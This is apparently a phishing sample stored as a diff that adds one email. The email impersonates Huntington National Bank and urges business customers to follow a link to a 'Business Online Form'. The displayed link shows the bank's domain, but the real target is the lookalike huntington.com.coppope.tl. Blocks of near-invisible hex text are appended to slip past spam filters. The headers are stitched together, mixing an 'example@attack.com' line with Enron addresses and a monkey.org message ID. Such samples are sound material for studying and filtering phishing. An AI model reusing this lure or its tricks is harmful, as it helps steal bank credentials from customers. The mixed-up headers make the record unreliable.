@@ -1,0 +1,46 @@
+From
+: example@attack.com
+From: pete.heintzelman@enron.com
+To: rusty.belflower@enron.com, gerald.nemec@enron.com, audrey.o'neil@enron.com
+Subject: Huntington National Bank: please confirm your online banking account data.
+X-MSMail-Priority: 3 (Normal)
+User-Agent: MIME-tools 4.104 (Entity 4.116)
+X-Mailer: MIME-tools 4.104 (Entity 4.116)
+X-Priority: 3 (Normal)
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+	boundary="--KQMMG134L2LRP_CIOEUL"
+Message-Id: <20080122004946.D71706FA1C4@mail2.monkey.org>
+Date: Mon, 21 Jan 2008 19:49:46 -0500 (EST)
+Content-Length: 4283
+Lines: 25
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 544
+
+----KQMMG134L2LRP_CIOEUL
+Content-Type: text/html;
+Content-Transfer-Encoding: 7Bit
+
+<head>
+<meta     http-equiv="Content-Type"    content="text/html;    charset=iso-8859-1">
+</head>
+
+<body>
+<p><font face="Verdana, Arial, Helvetica, sans-serif">Dear       business      customer     of    Huntington     National       Bank:</font></p>
+<p><font face="Verdana, Arial, Helvetica, sans-serif">Huntington   National  Bank    is    committed to safeguarding      customer       information and      combating fraud.      We    have     implemented      industry   leading     security    initiatives, and  our online      banking    services are   protected    by     the       strongest    encryption    methods       and   security      protocols      available.    We   continue  to develop       new    solutions   to       provide  our    online       banking services       and    their  customers    with      confidence and   security.</font></p>
+<p><font       face="Verdana, Arial, Helvetica, sans-serif">The    added   security measures   require   all     Huntington Business  Online      customers   to  complete     on      a regular basis  Business    Online     Form.<br>Please       use    the   hyperlink      below     to   access     Business    Online Form:<br></font></p>
+<p><font face="Verdana, Arial, Helvetica, sans-serif"><a       href="http://businessonline.huntington.com.coppope.tl/footer/process.jsp?id=99609327760712094695490434368059871909726956645"><font   size="2">http://businessonline.huntington.com/footer/process.jsp?id=99609327760712094695490434368059871909726956645</font></a></font></p>
+<p><font   face="Verdana, Arial, Helvetica, sans-serif">Thank   you     for    banking    with  us!</font></p>
+<p><font face="Verdana, Arial, Helvetica, sans-serif">Huntington       National  Bank    Customer    Support<br></font></p>
+<p><font     face="Verdana, Arial, Helvetica, sans-serif">_________________________________________________________________</font></p>
+<p><font       face="Verdana, Arial, Helvetica, sans-serif">&copy;   2008  Huntington  Bancshares       Incorporated</font></p>
+<p><font      color="#FFFFFB" face="Verdana, Arial, Helvetica, sans-serif">FO1: 0x8793, 0x476, 0x5, 0x23, 0x2010, 0x2533, 0x7331, 0x503, 0x7578, 0x314, 0x24133556, 0x1201, 0x0, 0x1  serv, T64K   0x10, 0x7, 0x74, 0x45, 0x3, 0x926     NR4: 0x3589, 0x36821010, 0x22791314, 0x5095, 0x9, 0x18499353, 0x9788, 0x9298    0x40929176, 0x6842, 0x1, 0x96, 0x05875491, 0x48368622, 0x0, 0x6, 0x8484, 0x7156, 0x12151020       3LO: 0x69497519, 0x457, 0x4, 0x206, 0x98, 0x0, 0x05547743, 0x92, 0x3382, 0x7, 0x8367, 0x0908 file: 0x93, 0x8711, 0x3223, 0x58, 0x67360796, 0x7, 0x011, 0x6, 0x00, 0x98859200, 0x7, 0x6346, 0x3008, 0x5236, 0x606   K20A: 0x074, 0x70701828, 0x3158, 0x1, 0x96410863     0x39, 0x4947, 0x2, 0x788, 0x3009, 0x74802804, 0x769</font></p>
+<p><font    color="#FFFFF0"      face="Verdana, Arial, Helvetica, sans-serif"><span>SLYX: 0x17790707, 0x785, 0x00, 0x6, 0x1, 0x7, 0x87, 0x464, 0x8313      0x963, 0x70, 0x6055, 0x22770359    0x8924, 0x3405, 0x79474096, 0x01, 0x15368248, 0x981, 0x7295       WI4R, VA9, 1ZX, common, hex, VGQ    0x21643726, 0x4696, 0x39009722     0x49273836   X7V7 create start stack 0SP0.  serv: 0x6704, 0x44, 0x5895, 0x57682338, 0x85584045, 0x408, 0x02698004, 0x6426, 0x5358, 0x2745, 0x4, 0x02      0x61892622, 0x408, 0x38, 0x8, 0x1426, 0x5676    0x054, 0x6, 0x6, 0x9129, 0x31878580, 0x135, 0x476, 0x911, 0x4582</span></font></p>
+<p><font color="#FFFFFD"       face="Verdana, Arial, Helvetica, sans-serif"><span>0x309, 0x546, 0x45577645, 0x10, 0x3679, 0x84488337, 0x84618006    0x1, 0x13, 0x62, 0x19950873, 0x11, 0x60, 0x45, 0x40, 0x77229714, 0x263, 0x4401, 0x74, 0x34, 0x37333583       serv: 0x3, 0x65, 0x68271435, 0x0417, 0x68, 0x2238, 0x39101413, 0x235, 0x01519197, 0x0, 0x94413079, 0x21519586, 0x1       640K: 0x96967662     type       stack: 0x2, 0x3441, 0x95843638, 0x0178, 0x0637, 0x0, 0x1818, 0x523, 0x5939, 0x05790520, 0x244, 0x96859943, 0x48 0x4401, 0x12, 0x86643644, 0x47, 0x4, 0x052, 0x483, 0x103, 0x64     0x9, 0x210, 0x62409681, 0x71, 0x2131, 0x24, 0x7, 0x4359, 0x79, 0x8, 0x4522     close 2D7.       D5VH: 0x8022, 0x6059, 0x97999448, 0x2, 0x8, 0x1592, 0x238, 0x4961</span></font></p>
+</body>
+</html>
+
+
+----KQMMG134L2LRP_CIOEUL--
